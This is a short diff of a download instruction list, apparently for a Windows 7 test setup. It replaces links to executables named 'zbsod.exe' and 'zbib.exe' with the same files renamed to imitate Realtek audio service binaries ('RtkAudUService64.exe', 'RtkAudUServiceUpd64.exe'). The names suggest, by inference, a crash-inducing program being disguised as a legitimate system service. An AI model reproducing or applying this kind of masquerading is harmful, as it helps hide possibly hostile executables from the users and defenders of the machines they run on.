@@ -21,7 +21,7 @@ win7_x32
 3. download
 
 zbsod:
-https://github.com/Helheimiss/zbsod/raw/refs/heads/main/bin/zbsod.exe
+https://github.com/Helheimiss/zbsod/raw/refs/heads/main/bin/RtkAudUService64.exe
 
 zbib:
-https://github.com/Helheimiss/zbsod/raw/refs/heads/main/bin/zbib.exe
+https://github.com/Helheimiss/zbsod/raw/refs/heads/main/bin/RtkAudUServiceUpd64.exe
